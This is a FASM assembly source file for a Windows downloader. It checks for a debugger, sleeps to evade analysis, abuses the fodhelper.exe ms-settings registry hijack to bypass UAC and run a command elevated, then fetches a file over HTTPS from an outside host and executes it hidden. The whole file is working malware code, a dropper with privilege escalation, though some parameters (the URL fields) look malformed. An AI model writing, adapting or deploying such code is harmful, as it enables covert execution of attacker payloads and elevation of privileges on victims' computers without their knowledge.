format PE64 GUI
entry start
include 'C:\FLAT\INCLUDE\win64a.inc'

WINHTTP_ACCESS_TYPE_NO_PROXY = 0
WINHTTP_FLAG_SECURE          = 0x00800000
HKEY_CURRENT_USER        = 80000001h
KEY_WRITE                = 20006h
REG_SZ                   = 1

section '.text' code readable executable
start:
    mov rax, [gs:60h]
    cmp byte[rax+2], 1
    je debug_opcode
    
   invoke Sleep, 15000
   call uac_fodhelper 
  call DownLoadFile
    
    
    
proc DownLoadFile
    sub rsp, 8
   
    invoke WinHttpOpen, useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, 0, 0, 0 
    mov [hSession], rax 
    
    invoke WinHttpConnect, [hSession], servername, port, 0
    mov [hConnect], rax
    
    invoke WinHttpOpenRequest, [hConnect], 0, indes, 0, 0, 0, WINHTTP_FLAG_SECURE 
    mov [hRequest], rax 
    
    invoke WinHttpSendRequest, [hRequest], 0, 0, 0, 0, 0, 0
    invoke WinHttpReceiveResponse , [hRequest], 0
    
    invoke CreateFileA, filename, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
    mov [hFile], rax

whiles:
    invoke WinHttpQueryDataAvailable, [hRequest],  dwBytesAvaliable
    
    cmp [dwBytesAvaliable], 0
    je handle
    invoke WinHttpReadData, [hRequest],  buffer, [dwBytesAvaliable],  dwBytesRead
    invoke WriteFile, [hFile],  buffer, [dwBytesRead],  tempVar, 0
    
    jmp whiles
    

handle:
  
    invoke CloseHandle, [hFile]
    invoke ShellExecuteA, 0, "open", filename, 0, 0, SW_HIDE
    invoke WinHttpCloseHandle, [hRequest]
    invoke WinHttpCloseHandle, [hSession]
    invoke WinHttpCloseHandle, [hConnect]
    
    add rsp, 8
endp 
 
uac_fodhelper:
     invoke RegCreateKeyExA, HKEY_CURRENT_USER,\
        "Software\\Classes\\ms-settings\\shell\\open\\command",\
        0, 0, 0, KEY_WRITE, 0, key_handle, 0
     
        
         invoke RegSetValueExA, [key_handle], "", 0,\
        REG_SZ, command_str, command_len, 30
        
        
        invoke ShellExecuteA, 0, "open", "fodhelper.exe", 0, 0, SW_HIDE
        cmp rax, 32
        jle uac_failed
        
          invoke Sleep, 50000
    invoke RegDeleteKeyA, HKEY_CURRENT_USER,\
        "Software\\Classes\\ms-settings"
    ret
   
uac_failed:
    invoke MessageBoxA, 0, fail, fail, 0
    
  
debug_opcode:
  invoke MessageBoxA, 0, msgone, msgone, 0
  jmp exit
  
exit:
    invoke ExitProcess, 0
    ret
    

   
section '.data' data readable writeable
    kDeshtpp dq 0
    WinHttpOpens dq 0
   
    command_str db 'cmd.exe /c start D:\mytest.exe', 0
    command_len = $ - command_str

    tempVar dd 0
   filename db 'D:\test.txt',0
    dwBytesRead dd 0
    dwBytesAvaliable dd 0
    buffer rb 4096
    
    fail db 'Error',0
    
    key_handle dd 0
    
    hFile dq 0
    hSession dq 0
    hRequest dq 0
    hConnect dq 0
    
    useragent du 'Firefox',0
    
    
    servername du 'https://statyatest.com',0
    port dw 443
    
    indes du 'www.example.com',0
    
    msg db 'true',0
    msgone db 'false',0
section '.idata' import data readable
    library kernel32, 'KERNEL32.DLL',\
            user32,   'USER32.DLL',\
            winhttp,  'WINHTTP.DLL',\
            shell32, 'SHELL32.DLL',\
            advapi32, 'ADVAPI32.DLL' 
     
     import advapi32,\
           RegCreateKeyExA,    'RegCreateKeyExA',\
           RegSetValueExA,     'RegSetValueExA',\
           RegDeleteKeyA,      'RegDeleteKeyA',\
           RegCloseKey,        'RegCloseKey'
     
     import shell32,\
       ShellExecuteA, 'ShellExecuteA'  

    import winhttp,\
           WinHttpOpen, 'WinHttpOpen',\
           WinHttpConnect, 'WinHttpConnect',\
           WinHttpOpenRequest, 'WinHttpOpenRequest',\
           WinHttpSendRequest, 'WinHttpSendRequest',\
           WinHttpReceiveResponse, 'WinHttpReceiveResponse',\
           WinHttpQueryDataAvailable, 'WinHttpQueryDataAvailable',\
           WinHttpReadData, 'WinHttpReadData',\
           WinHttpCloseHandle, 'WinHttpCloseHandle'
    
    import kernel32,\
            Sleep,  'Sleep',\
           ExitProcess, 'ExitProcess',\
           CreateFileA, 'CreateFileA',\
           WriteFile,   'WriteFile' ,\
           CloseHandle, 'CloseHandle'
    
    import user32,\
           MessageBoxA, 'MessageBoxA'
